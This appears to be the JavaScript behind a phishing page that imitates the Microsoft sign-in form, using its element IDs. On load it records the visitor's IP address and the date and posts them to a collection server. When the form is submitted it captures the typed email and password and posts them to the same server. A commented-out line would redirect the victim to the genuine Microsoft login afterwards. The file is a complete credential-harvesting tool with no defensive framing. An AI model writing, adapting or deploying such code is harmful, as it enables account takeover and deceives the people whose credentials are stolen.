let data = {};

const form = document.querySelector("#i0281");
const mail  = document.querySelector("#i0116");
const password  = document.querySelector("#i0118");
let ip = undefined;

async function getIp() {
    await fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            ip = data.ip;
        })
        .catch(error => {
            console.error('Error fetching IP address:', error);
        });
};

const currentDate = new Date();
const date = currentDate.toLocaleString();

getIp().then(() => {
    data = {
        date,
        ip,
    };

    console.log(data);

    fetch('http://localhost:3000/', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(data)
    })
    .then(response => response.json())
    .then(data => {
        console.log('Data successfully sent:', data);
    })
    .catch(error => {
        console.error('Error sending data:', error);
    });

});
    

form.addEventListener('submit', function(event) {
    event.preventDefault();

    data = {
        date,
        ip,
        mail: mail.value,
        password: password.value,
    };

    console.log(data);

    fetch('http://localhost:3000/', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(data)
    })
    .then(response => response.json())
    .then(data => {
        console.log('Data successfully sent:', data);
    })
    .catch(error => {
        console.error('Error sending data:', error);
    });
    

    // window.location.href = 'https://login.microsoftonline.com/common/login';
});